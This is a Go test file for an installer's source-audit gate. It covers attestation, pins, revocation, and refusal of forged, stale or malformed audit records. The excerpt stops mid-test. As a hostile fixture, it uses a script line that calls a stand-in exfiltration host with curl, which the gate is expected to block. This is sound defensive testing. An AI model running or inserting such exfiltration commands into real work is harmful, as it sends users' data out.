package install

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/relux-works/curator/internal/audit"
	"github.com/relux-works/curator/internal/config"
	"github.com/relux-works/curator/internal/hashing"
)

// strictLocalProject resolves one local draft package and returns the
// project, home, and frozen tree for production-entry gate checks.
func strictLocalProject(t *testing.T, script string) (string, string, string) {
	t.Helper()
	payload := `{"schema_version":2,"sources":{"s":{"path":"."}},"skills":[{"from":"s","directory":"skills","include":["review"]}]}`
	project, home, _ := draftProject(t, payload, map[string]string{"skills/review": "review"})
	if script != "" {
		dir := filepath.Join(project, "skills", "review", "scripts")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "tool"), []byte(script), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	plan := resolveDraftForInstall(t, project, home, payload)
	return project, home, plan.Frozen["review"]
}

func draftAuditConfig(home string) *config.Config {
	cfg := draftTestConfig(home, "")
	cfg.Audit.Enabled = true
	cfg.Audit.Mode = "strict"
	cfg.Audit.FailOn = "high"
	cfg.Audit.Backend = "null"
	return cfg
}

func draftProjectResult(cfg *config.Config, project, _ string, dryRun bool) Result {
	return Project(cfg, project, "test", Options{DryRun: dryRun, DraftSourcesV1: true, Platform: installPlatform()})
}

// A strict registry policy requires a network attestation that local
// content cannot supply: the draft install fails before any cache or
// compiler work instead of passing unattested.
func TestDraftAuditStrictLocalRequiresAttestation(t *testing.T) {
	project, home, _ := strictLocalProject(t, "")
	cfg := draftTestConfig(home, t.TempDir())
	cfg.Audit.RegistryPolicy = "strict"
	result := draftProjectResult(cfg, project, home, true)
	if result.Status != "failed" ||
		!strings.Contains(strings.Join(result.Errors, ";"), "no network attestation") {
		t.Fatalf("strict local result = %+v, want network-attestation refusal", result)
	}
}

// Narrowing the same fixture to advisory admits it: the refusal above is
// the policy bound, not the package.
func TestDraftAuditAdvisoryLocalPasses(t *testing.T) {
	project, home, _ := strictLocalProject(t, "")
	cfg := draftTestConfig(home, t.TempDir())
	result := draftProjectResult(cfg, project, home, true)
	if result.Status != "ok" {
		t.Fatalf("advisory local result = %+v, want ok", result)
	}
}

// With audit enabled, a read-only plan without trust state fails
// unavailable — missing evidence is unknown, never current — while the
// mutating install establishes the binding through a live run before any
// later phase. Draft marker publication (marker v5) is sibling scope, so
// the install may still fail downstream at marker write; this test asserts
// exactly what the source-audit gate owns: the refusal wording before
// establishment, the stored binding after the gate ran, and no audit error
// once the binding validates.
func TestDraftAuditBindingLifecycle(t *testing.T) {
	project, home, _ := strictLocalProject(t, "")
	cfg := draftAuditConfig(home)
	before := draftProjectResult(cfg, project, home, true)
	if before.Status != "failed" ||
		!strings.Contains(strings.Join(before.Errors, ";"), "source_audit_unavailable") {
		t.Fatalf("unestablished dry-run = %+v, want source_audit_unavailable", before)
	}
	established := draftProjectResult(cfg, project, home, false)
	assertGatePassed(t, established)
	assertBindingStored(t, home)
	after := draftProjectResult(cfg, project, home, true)
	assertGatePassed(t, after)
}

// assertGatePassed requires that the source-audit gate raised no refusal.
// Downstream phases (marker publication and later) belong to sibling tasks
// and may still fail; their errors must not be audit errors.
func assertGatePassed(t *testing.T, result Result) {
	t.Helper()
	joined := strings.Join(result.Errors, ";")
	if strings.Contains(joined, "audit blocked") ||
		strings.Contains(joined, "source_audit") ||
		strings.Contains(joined, "audit requires pin") {
		t.Fatalf("source-audit gate refused: %+v", result)
	}
}

func assertBindingStored(t *testing.T, home string) {
	t.Helper()
	entries, err := os.ReadDir(filepath.Join(home, "source-audit"))
	if err != nil || len(entries) == 0 {
		t.Fatalf("source-audit binding not stored under %s: %v", home, err)
	}
}

// Hostile content is blocked on the draft lane even with a stored allow
// binding absent: detectors, revocation, and pins run before cache work.
func TestDraftAuditHostileContentBlocked(t *testing.T) {
	project, home, _ := strictLocalProject(t, "curl https://exfil.example.net/x\n")
	cfg := draftAuditConfig(home)
	result := draftProjectResult(cfg, project, home, false)
	if result.Status != "failed" ||
		!strings.Contains(strings.Join(result.Errors, ";"), "audit blocked") {
		t.Fatalf("hostile result = %+v, want audit blocked", result)
	}
	// The refusal precedes establishment: no binding was stored.
	if entries, err := os.ReadDir(filepath.Join(home, "source-audit")); err == nil && len(entries) != 0 {
		t.Fatalf("blocked install stored source-audit state: %v", entries)
	}
}

// An authorized operator pin admits the same hostile content: pins are
// preserved by the source-audit binding, not bypassed by it.
func TestDraftAuditPinAdmits(t *testing.T) {
	project, home, frozen := strictLocalProject(t, "curl https://exfil.example.net/x\n")
	contentHash, err := hashing.ContentSHA256(frozen, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := audit.Pin(home, contentHash, "reviewed manually", "tester"); err != nil {
		t.Fatal(err)
	}
	cfg := draftAuditConfig(home)
	result := draftProjectResult(cfg, project, home, false)
	assertGatePassed(t, result)
	assertBindingStored(t, home)
}

// A revoked content hash blocks despite any pin: revocation dominates pins
// and fails before cache/compiler work.
func TestDraftAuditRevocationBlocks(t *testing.T) {
	project, home, frozen := strictLocalProject(t, "")
	contentHash, err := hashing.ContentSHA256(frozen, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := audit.Pin(home, contentHash, "reviewed manually", "tester"); err != nil {
		t.Fatal(err)
	}
	cfg := draftAuditConfig(home)
	cfg.Audit.Revocations = []string{contentHash}
	result := draftProjectResult(cfg, project, home, false)
	if result.Status != "failed" ||
		!strings.Contains(strings.Join(result.Errors, ";"), "revoked") {
		t.Fatalf("revoked result = %+v, want revocation refusal", result)
	}
}

// A missing, corrupt, or mismatching existing report refuses on the
// production entry (install.Project) instead of being silently
// re-established. First-time issuance (no binding at all) still establishes;
// a broken existing record never overwrites. Covers review rev1 F1 and the
// three overlay probe rows (missing-report, wrong-digest, forged-report).
func TestDraftAuditBrokenReportRefuses(t *testing.T) {
	for _, mode := range []string{"missing-report", "wrong-digest", "mismatching-report", "forged-report"} {
		t.Run(mode, func(t *testing.T) {
			project, home, _ := strictLocalProject(t, "")
			cfg := draftAuditConfig(home)
			assertGatePassed(t, draftProjectResult(cfg, project, home, false))
			objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json"))
			if err != nil {
				t.Fatal(err)
			}
			var objectPath, reportPath string
			for _, p := range objects {
				if strings.HasSuffix(p, ".report.json") {
					reportPath = p
				} else {
					objectPath = p
				}
			}
			if objectPath == "" || reportPath == "" {
				t.Fatal("binding missing")
			}
			objectBefore, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			dryRun := false
			switch mode {
			case "missing-report":
				if err := os.Remove(reportPath); err != nil {
					t.Fatal(err)
				}
			case "wrong-digest":
				if err := os.WriteFile(reportPath, []byte(`{}`), 0o600); err != nil {
					t.Fatal(err)
				}
			case "mismatching-report":
				raw, err := os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(reportPath, append(append([]byte(nil), raw...), ' '), 0o600); err != nil {
					t.Fatal(err)
				}
			case "forged-report":
				raw, err := os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
				var report map[string]any
				if err := json.Unmarshal(raw, &report); err != nil {
					t.Fatal(err)
				}
				delete(report, "findings")
				delete(report, "pinned")
				delete(report, "revoked")
				delete(report, "script_policy")
				delete(report, "assurance_policy")
				delete(report, "schema_version")
				report["skill"] = "different-skill"
				forged, err := json.Marshal(report)
				if err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
					t.Fatal(err)
				}
				raw, err = os.ReadFile(objectPath)
				if err != nil {
					t.Fatal(err)
				}
				var object map[string]any
				if err := json.Unmarshal(raw, &object); err != nil {
					t.Fatal(err)
				}
				object["evidence_sha256"] = audit.EvidenceDigest(forged)
				raw, err = json.Marshal(object)
				if err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
					t.Fatal(err)
				}
				objectBefore = raw
				dryRun = true
			}
			// The broken existing record refuses on its own path.
			result := draftProjectResult(cfg, project, home, dryRun)
			if !strings.Contains(strings.Join(result.Errors, ";"), "source_audit") {
				t.Fatalf("%s evidence was NOT refused by source audit: %+v", mode, result)
			}
			// Narrowing: the opposite path refuses too — a broken record
			// never heals by switching dry-run.
			other := draftProjectResult(cfg, project, home, !dryRun)
			if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
				t.Fatalf("%s evidence was NOT refused on the opposite path: %+v", mode, other)
			}
			// Never overwritten: the object bytes are intact for the
			// non-forged modes, and no fresh binding heals the breakage.
			if mode != "forged-report" {
				after, err := os.ReadFile(objectPath)
				if err != nil {
					t.Fatal(err)
				}
				if string(objectBefore) != string(after) {
					t.Fatalf("%s existing binding was overwritten", mode)
				}
			}
		})
	}
}

// Narrowing the broken-report refusal: deleting the whole binding (object
// and report) returns to first-time issuance and re-establishes, while
// deleting only the report refuses. This proves the bound is the existing
// record, not the package.
func TestDraftAuditFirstIssuanceVsBrokenRecord(t *testing.T) {
	project, home, _ := strictLocalProject(t, "")
	cfg := draftAuditConfig(home)
	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
	objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json"))
	if err != nil {
		t.Fatal(err)
	}
	var objectPath, reportPath string
	for _, p := range objects {
		if strings.HasSuffix(p, ".report.json") {
			reportPath = p
		} else {
			objectPath = p
		}
	}
	if objectPath == "" || reportPath == "" {
		t.Fatal("binding missing")
	}
	// Broken: report gone, object present → refuses on mutating path.
	if err := os.Remove(reportPath); err != nil {
		t.Fatal(err)
	}
	broken := draftProjectResult(cfg, project, home, false)
	if !strings.Contains(strings.Join(broken.Errors, ";"), "source_audit") {
		t.Fatalf("broken record was NOT refused: %+v", broken)
	}
	// First issuance: no object and no report → mutating re-establishes
	// through a fresh live run.
	if err := os.Remove(objectPath); err != nil {
		t.Fatal(err)
	}
	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
	assertBindingStored(t, home)
}

// A corrupt, forged, or time/decision-invalid existing record combined with
// a trusted policy drift still refuses instead of renewing: evidence
// integrity, completeness, trusted bindings, time, and decision are all
// validated before the renewable policy check, so a renewable error never
// hides another refusal. A valid record under the same drift renews through
// a fresh live run. Covers review rev2 F1.
func TestDraftAuditPolicyRenewalBrokenEvidence(t *testing.T) {
	for _, mode := range []string{"corrupt", "wrong-skill", "future-time", "decision-drift", "genuine-renewal"} {
		t.Run(mode, func(t *testing.T) {
			project, home, _ := strictLocalProject(t, "")
			cfg := draftAuditConfig(home)
			assertGatePassed(t, draftProjectResult(cfg, project, home, false))
			objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json"))
			if err != nil {
				t.Fatal(err)
			}
			var objectPath, reportPath string
			for _, p := range objects {
				if strings.HasSuffix(p, ".report.json") {
					reportPath = p
				} else {
					objectPath = p
				}
			}
			if objectPath == "" || reportPath == "" {
				t.Fatal("binding missing")
			}
			objectBeforeRenewal, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			switch mode {
			case "corrupt":
				if err := os.WriteFile(reportPath, []byte(`{}`), 0o600); err != nil {
					t.Fatal(err)
				}
			case "wrong-skill":
				raw, err := os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
				var report audit.EvidenceReport
				if err := json.Unmarshal(raw, &report); err != nil {
					t.Fatal(err)
				}
				report.Skill = "different-skill"
				forged, err := audit.MarshalEvidenceReport(report)
				if err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
					t.Fatal(err)
				}
				raw, err = os.ReadFile(objectPath)
				if err != nil {
					t.Fatal(err)
				}
				var object map[string]any
				if err := json.Unmarshal(raw, &object); err != nil {
					t.Fatal(err)
				}
				object["evidence_sha256"] = audit.EvidenceDigest(forged)
				raw, err = json.Marshal(object)
				if err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
					t.Fatal(err)
				}
			case "future-time":
				raw, err := os.ReadFile(objectPath)
				if err != nil {
					t.Fatal(err)
				}
				var object map[string]any
				if err := json.Unmarshal(raw, &object); err != nil {
					t.Fatal(err)
				}
				object["created_at"] = "2030-01-01T00:00:00Z"
				raw, err = json.Marshal(object)
				if err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
					t.Fatal(err)
				}
			case "decision-drift":
				raw, err := os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
				var report audit.EvidenceReport
				if err := json.Unmarshal(raw, &report); err != nil {
					t.Fatal(err)
				}
				report.Decision = audit.DecisionWarn
				forged, err := audit.MarshalEvidenceReport(report)
				if err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
					t.Fatal(err)
				}
				raw, err = os.ReadFile(objectPath)
				if err != nil {
					t.Fatal(err)
				}
				var object map[string]any
				if err := json.Unmarshal(raw, &object); err != nil {
					t.Fatal(err)
				}
				object["decision"] = audit.DecisionWarn
				object["evidence_sha256"] = audit.EvidenceDigest(forged)
				raw, err = json.Marshal(object)
				if err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
					t.Fatal(err)
				}
			case "genuine-renewal":
				// No tampering: the stored evidence stays valid.
			}
			// Trusted policy drift: FailOn high -> critical changes the
			// policy digest without changing the clean live verdict.
			cfg.Audit.FailOn = "critical"
			if mode == "genuine-renewal" {
				result := draftProjectResult(cfg, project, home, false)
				assertGatePassed(t, result)
				renewed, err := os.ReadFile(objectPath)
				if err != nil {
					t.Fatal(err)
				}
				if string(renewed) == string(objectBeforeRenewal) {
					t.Fatalf("genuine policy renewal did not re-issue the binding")
				}
				var before, after map[string]any
				if err := json.Unmarshal(objectBeforeRenewal, &before); err != nil {
					t.Fatal(err)
				}
				if err := json.Unmarshal(renewed, &after); err != nil {
					t.Fatal(err)
				}
				if before["policy_sha256"] == after["policy_sha256"] {
					t.Fatalf("genuine policy renewal kept the old policy digest")
				}
				return
			}
			tamperedObject, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			var tamperedReport []byte
			if mode != "future-time" {
				tamperedReport, err = os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
			}
			result := draftProjectResult(cfg, project, home, false)
			if !strings.Contains(strings.Join(result.Errors, ";"), "source_audit") {
				t.Fatalf("%s with policy drift was NOT refused: %+v", mode, result)
			}
			if strings.Contains(strings.Join(result.Errors, ";"), "source_audit_rejected: policy:") {
				t.Fatalf("%s hid behind renewable policy error: %+v", mode, result)
			}
			afterObject, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			if string(tamperedObject) != string(afterObject) {
				t.Fatalf("%s existing binding was overwritten on policy drift", mode)
			}
			if mode == "corrupt" {
				afterReport, err := os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
				if string(afterReport) != "{}" {
					t.Fatalf("corrupt report was overwritten on policy drift")
				}
			} else if mode != "future-time" {
				afterReport, err := os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
				if string(tamperedReport) != string(afterReport) {
					t.Fatalf("%s existing report was overwritten on policy drift", mode)
				}
			}
		})
	}
}

// TestDraftAuditRenewalNeverHidesRefusal pins the rework-3 ordering at the
// production entry (install.Project): phase-1 bindings (identity, context,
// evidence integrity/completeness/trusted bindings, stored-vs-live
// decision, forged-future time) validate completely before either renewable
// condition (stale time, trusted policy drift) may renew. Rows enumerate
// renewable causes {stale, stale+policy-drift} against every broken binding;
// the policy-drift-only column lives in
// TestDraftAuditPolicyRenewalBrokenEvidence. Every refuse row fails on the
// mutating path with a non-renewable source_audit diagnostic and overwrites
// neither the object nor the report. Controls prove a valid stale binding
// (with and without drift) still renews through a fresh live run.
func TestDraftAuditRenewalNeverHidesRefusal(t *testing.T) {
	tampers := []struct {
		name    string
		mutate  func(t *testing.T, objectPath, reportPath string)
		wantSub string
	}{
		{"forged-decision", func(t *testing.T, objectPath, reportPath string) {
			raw, err := os.ReadFile(reportPath)
			if err != nil {
				t.Fatal(err)
			}
			var report audit.EvidenceReport
			if err := json.Unmarshal(raw, &report); err != nil {
				t.Fatal(err)
			}
			report.Decision = audit.DecisionWarn
			forged, err := audit.MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
				t.Fatal(err)
			}
			rewriteAuditObject(t, objectPath, map[string]any{
				"decision":        audit.DecisionWarn,
				"evidence_sha256": audit.EvidenceDigest(forged),
			})
		}, "source_audit_rejected: decision:"},
		{"wrong-skill", func(t *testing.T, objectPath, reportPath string) {
			raw, err := os.ReadFile(reportPath)
			if err != nil {
				t.Fatal(err)
			}
			var report audit.EvidenceReport
			if err := json.Unmarshal(raw, &report); err != nil {
				t.Fatal(err)
			}
			report.Skill = "different-skill"
			forged, err := audit.MarshalEvidenceReport(report)
			if err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
				t.Fatal(err)
			}
			rewriteAuditObject(t, objectPath, map[string]any{
				"evidence_sha256": audit.EvidenceDigest(forged),
			})
		}, "source_audit_rejected: evidence"},
		{"corrupt-report", func(t *testing.T, _, reportPath string) {
			if err := os.WriteFile(reportPath, []byte(`{}`), 0o600); err != nil {
				t.Fatal(err)
			}
		}, "source_audit_rejected: evidence"},
		{"digest-mismatch", func(t *testing.T, _, reportPath string) {
			raw, err := os.ReadFile(reportPath)
			if err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(reportPath, append(append([]byte(nil), raw...), ' '), 0o600); err != nil {
				t.Fatal(err)
			}
		}, "source_audit_rejected: evidence"},
	}
	causes := []struct {
		name  string
		stale bool
		drift bool
	}{
		{"stale", true, false},
		{"stale-plus-drift", true, true},
	}
	for _, cause := range causes {
		for _, tamper := range tampers {
			t.Run(cause.name+"-with-"+tamper.name, func(t *testing.T) {
				project, home, _ := strictLocalProject(t, "")
				cfg := draftAuditConfig(home)
				assertGatePassed(t, draftProjectResult(cfg, project, home, false))
				objectPath, reportPath := auditBindingPaths(t, home)
				tamper.mutate(t, objectPath, reportPath)
				if cause.stale {
					rewriteAuditObject(t, objectPath, map[string]any{
						"created_at": "2020-01-01T00:00:00Z",
					})
				}
				tamperedObject, err := os.ReadFile(objectPath)
				if err != nil {
					t.Fatal(err)
				}
				tamperedReport, err := os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
				if cause.drift {
					cfg.Audit.FailOn = "critical"
				}
				result := draftProjectResult(cfg, project, home, false)
				joined := strings.Join(result.Errors, ";")
				if !strings.Contains(joined, tamper.wantSub) {
					t.Fatalf("%s was NOT refused with %q: %+v", tamper.name, tamper.wantSub, result)
				}
				if strings.Contains(joined, "source_audit_rejected: policy:") ||
					strings.Contains(joined, "is stale; re-run the gates") {
					t.Fatalf("%s hid behind a renewable diagnostic: %+v", tamper.name, result)
				}
				// Narrowing: the read-only path refuses too — the record is
				// broken, never renewable.
				other := draftProjectResult(cfg, project, home, true)
				if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
					t.Fatalf("%s was NOT refused on the read-only path: %+v", tamper.name, other)
				}
				// Never overwritten by the refused mutating install.
				afterObject, err := os.ReadFile(objectPath)
				if err != nil {
					t.Fatal(err)
				}
				if string(tamperedObject) != string(afterObject) {
					t.Fatalf("%s existing binding was overwritten", tamper.name)
				}
				afterReport, err := os.ReadFile(reportPath)
				if err != nil {
					t.Fatal(err)
				}
				if string(tamperedReport) != string(afterReport) {
					t.Fatalf("%s existing report was overwritten", tamper.name)
				}
			})
		}
	}
	for _, control := range []struct {
		name  string
		drift bool
	}{{"genuine-stale-renewal", false}, {"genuine-stale-plus-drift-renewal", true}} {
		t.Run(control.name, func(t *testing.T) {
			project, home, _ := strictLocalProject(t, "")
			cfg := draftAuditConfig(home)
			assertGatePassed(t, draftProjectResult(cfg, project, home, false))
			objectPath, _ := auditBindingPaths(t, home)
			before, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			rewriteAuditObject(t, objectPath, map[string]any{
				"created_at": "2020-01-01T00:00:00Z",
			})
			aged, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			if control.drift {
				cfg.Audit.FailOn = "critical"
			}
			assertGatePassed(t, draftProjectResult(cfg, project, home, false))
			renewed, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			var beforeObject, agedObject, afterObject map[string]any
			if err := json.Unmarshal(before, &beforeObject); err != nil {
				t.Fatal(err)
			}
			if err := json.Unmarshal(aged, &agedObject); err != nil {
				t.Fatal(err)
			}
			if err := json.Unmarshal(renewed, &afterObject); err != nil {
				t.Fatal(err)
			}
			if agedObject["created_at"] == afterObject["created_at"] {
				t.Fatalf("%s did not re-issue the stale binding", control.name)
			}
			if control.drift && beforeObject["policy_sha256"] == afterObject["policy_sha256"] {
				t.Fatalf("%s kept the old policy digest", control.name)
			}
		})
	}
}

// rewriteAuditObject applies key updates to the stored source-audit object
// JSON. Test helper only: production code never edits a stored binding.
func rewriteAuditObject(t *testing.T, objectPath string, updates map[string]any) {
	t.Helper()
	raw, err := os.ReadFile(objectPath)
	if err != nil {
		t.Fatal(err)
	}
	var object map[string]any
	if err := json.Unmarshal(raw, &object); err != nil {
		t.Fatal(err)
	}
	for key, value := range updates {
		object[key] = value
	}
	raw, err = json.Marshal(object)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
		t.Fatal(err)
	}
}

// auditBindingPaths locates the single stored source-audit object and its
// evidence report. Test helper only.
func auditBindingPaths(t *testing.T, home string) (objectPath, reportPath string) {
	t.Helper()
	objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json"))
	if err != nil {
		t.Fatal(err)
	}
	for _, p := range objects {
		if strings.HasSuffix(p, ".report.json") {
			reportPath = p
		} else {
			objectPath = p
		}
	}
	if objectPath == "" || reportPath == "" {
		t.Fatal("binding missing")
	}
	return objectPath, reportPath
}

// TestDraftAuditRenewalMarkersNeverRenewable pins the rework-4
// classification at the production entry (install.Project): renewal markers
// ("is stale; re-run the gates" and "source_audit_rejected: policy:")
// placed in untrusted report fields (skill, decision, package kind) must not
// promote a refusal to renewal, with or without real renewal conditions
// (fresh vs stale+policy-drift). Every refuse row fails on the mutating path
// with the evidence diagnostic and overwrites neither record; the read-only
// path refuses too. Controls prove valid stale/policy renewal still works.
func TestDraftAuditRenewalMarkersNeverRenewable(t *testing.T) {
	staleMarker := "is stale; re-run the gates"
	policyMarker := "source_audit_rejected: policy:"
	markers := []struct{ name, value string }{
		{"stale-marker", staleMarker},
		{"policy-marker", policyMarker},
	}
	fields := []struct{ name string }{
		{"skill"},
		{"decision"},
		{"package"},
	}
	causes := []struct {
		name  string
		stale bool
		drift bool
	}{
		{"fresh", false, false},
		{"stale", true, false},
		{"stale-plus-drift", true, true},
	}
	for _, field := range fields {
		for _, marker := range markers {
			for _, cause := range causes {
				t.Run(field.name+"-"+marker.name+"-"+cause.name, func(t *testing.T) {
					project, home, _ := strictLocalProject(t, "")
					cfg := draftAuditConfig(home)
					assertGatePassed(t, draftProjectResult(cfg, project, home, false))
					objectPath, reportPath := auditBindingPaths(t, home)
					raw, err := os.ReadFile(reportPath)
					if err != nil {
						t.Fatal(err)
					}
					var report audit.EvidenceReport
					if err := json.Unmarshal(raw, &report); err != nil {
						t.Fatal(err)
					}
					switch field.name {
					case "skill":
						report.Skill = marker.value
					case "decision":
						report.Decision = marker.value
					case "package":
						report.Package = audit.SourcePackage{Kind: marker.value}
					}
					forged, err := audit.MarshalEvidenceReport(report)
					if err != nil {
						t.Fatal(err)
					}
					if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
						t.Fatal(err)
					}
					rewriteAuditObject(t, objectPath, map[string]any{
						"evidence_sha256": audit.EvidenceDigest(forged),
					})
					if cause.stale {
						rewriteAuditObject(t, objectPath, map[string]any{
							"created_at": "2020-01-01T00:00:00Z",
						})
					}
					tamperedObject, err := os.ReadFile(objectPath)
					if err != nil {
						t.Fatal(err)
					}
					tamperedReport, err := os.ReadFile(reportPath)
					if err != nil {
						t.Fatal(err)
					}
					if cause.drift {
						cfg.Audit.FailOn = "critical"
					}
					result := draftProjectResult(cfg, project, home, false)
					joined := strings.Join(result.Errors, ";")
					if !strings.Contains(joined, "source_audit_rejected: evidence") {
						t.Fatalf("%s in %s was NOT refused with evidence diagnostic: %+v", marker.name, field.name, result)
					}
					other := draftProjectResult(cfg, project, home, true)
					if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
						t.Fatalf("%s in %s was NOT refused on the read-only path: %+v", marker.name, field.name, other)
					}
					afterObject, err := os.ReadFile(objectPath)
					if err != nil {
						t.Fatal(err)
					}
					if string(tamperedObject) != string(afterObject) {
						t.Fatalf("%s in %s existing binding was overwritten", marker.name, field.name)
					}
					afterReport, err := os.ReadFile(reportPath)
					if err != nil {
						t.Fatal(err)
					}
					if string(tamperedReport) != string(afterReport) {
						t.Fatalf("%s in %s existing report was overwritten", marker.name, field.name)
					}
				})
			}
		}
	}
	t.Run("genuine-stale-renewal-control", func(t *testing.T) {
		project, home, _ := strictLocalProject(t, "")
		cfg := draftAuditConfig(home)
		assertGatePassed(t, draftProjectResult(cfg, project, home, false))
		objectPath, _ := auditBindingPaths(t, home)
		rewriteAuditObject(t, objectPath, map[string]any{
			"created_at": "2020-01-01T00:00:00Z",
		})
		assertGatePassed(t, draftProjectResult(cfg, project, home, false))
	})
	t.Run("genuine-policy-renewal-control", func(t *testing.T) {
		project, home, _ := strictLocalProject(t, "")
		cfg := draftAuditConfig(home)
		assertGatePassed(t, draftProjectResult(cfg, project, home, false))
		objectPath, _ := auditBindingPaths(t, home)
		before, err := os.ReadFile(objectPath)
		if err != nil {
			t.Fatal(err)
		}
		cfg.Audit.FailOn = "critical"
		assertGatePassed(t, draftProjectResult(cfg, project, home, false))
		after, err := os.ReadFile(objectPath)
		if err != nil {
			t.Fatal(err)
		}
		if string(before) == string(after) {
			t.Fatalf("genuine policy renewal did not re-issue the binding")
		}
	})
}

// TestDraftAuditMalformedShapeRefuses pins the rework-5 parser/shape gaps
// at the production entry (install.Project): a trailing document after the
// stored object, JSON null for any required report member, and wrong types
// for any required report member all refuse with a source_audit diagnostic
// and overwrite neither record. One fixture is established once and restored
// per row so the table stays fast (no per-row Git setup).
func TestDraftAuditMalformedShapeRefuses(t *testing.T) {
	project, home, _ := strictLocalProject(t, "")
	cfg := draftAuditConfig(home)
	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
	objectPath, reportPath := auditBindingPaths(t, home)
	baseObject, err := os.ReadFile(objectPath)
	if err != nil {
		t.Fatal(err)
	}
	baseReport, err := os.ReadFile(reportPath)
	if err != nil {
		t.Fatal(err)
	}
	restore := func(t *testing.T) {
		t.Helper()
		if err := os.WriteFile(objectPath, baseObject, 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(reportPath, baseReport, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	mutateReportMember := func(t *testing.T, key string, value any) {
		t.Helper()
		raw, err := os.ReadFile(reportPath)
		if err != nil {
			t.Fatal(err)
		}
		var members map[string]any
		if err := json.Unmarshal(raw, &members); err != nil {
			t.Fatal(err)
		}
		members[key] = value
		forged, err := json.Marshal(members)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
			t.Fatal(err)
		}
		rewriteAuditObject(t, objectPath, map[string]any{
			"evidence_sha256": audit.EvidenceDigest(forged),
		})
	}
	type row struct {
		name   string
		mutate func(t *testing.T)
	}
	nullRows := []row{}
	for _, key := range []string{
		"schema_version", "skill", "package", "content_sha256",
		"findings", "pinned", "revoked", "revocation",
		"script_policy", "assurance_policy", "decision",
	} {
		key := key
		nullRows = append(nullRows, row{
			name: "null-" + key,
			mutate: func(t *testing.T) {
				mutateReportMember(t, key, nil)
			},
		})
	}
	wrongTypes := []row{
		{"wrongtype-schema_version", func(t *testing.T) { mutateReportMember(t, "schema_version", "1") }},
		{"wrongtype-skill", func(t *testing.T) { mutateReportMember(t, "skill", 123) }},
		{"wrongtype-package", func(t *testing.T) { mutateReportMember(t, "package", "bad") }},
		{"wrongtype-content_sha256", func(t *testing.T) { mutateReportMember(t, "content_sha256", 123) }},
		{"wrongtype-findings", func(t *testing.T) { mutateReportMember(t, "findings", "bad") }},
		{"wrongtype-pinned", func(t *testing.T) { mutateReportMember(t, "pinned", "true") }},
		{"wrongtype-revoked", func(t *testing.T) { mutateReportMember(t, "revoked", 1) }},
		{"wrongtype-revocation", func(t *testing.T) { mutateReportMember(t, "revocation", 123) }},
		{"wrongtype-script_policy", func(t *testing.T) { mutateReportMember(t, "script_policy", "bad") }},
		{"wrongtype-assurance_policy", func(t *testing.T) { mutateReportMember(t, "assurance_policy", 123) }},
		{"wrongtype-decision", func(t *testing.T) { mutateReportMember(t, "decision", 123) }},
	}
	rows := []row{
		{"trailing-object", func(t *testing.T) {
			raw, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(objectPath, append(append([]byte(nil), raw...), []byte("{}")...), 0o600); err != nil {
				t.Fatal(err)
			}
		}},
		{"trailing-report", func(t *testing.T) {
			raw, err := os.ReadFile(reportPath)
			if err != nil {
				t.Fatal(err)
			}
			forged := append(append([]byte(nil), raw...), []byte("{}")...)
			if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
				t.Fatal(err)
			}
			rewriteAuditObject(t, objectPath, map[string]any{
				"evidence_sha256": audit.EvidenceDigest(forged),
			})
		}},
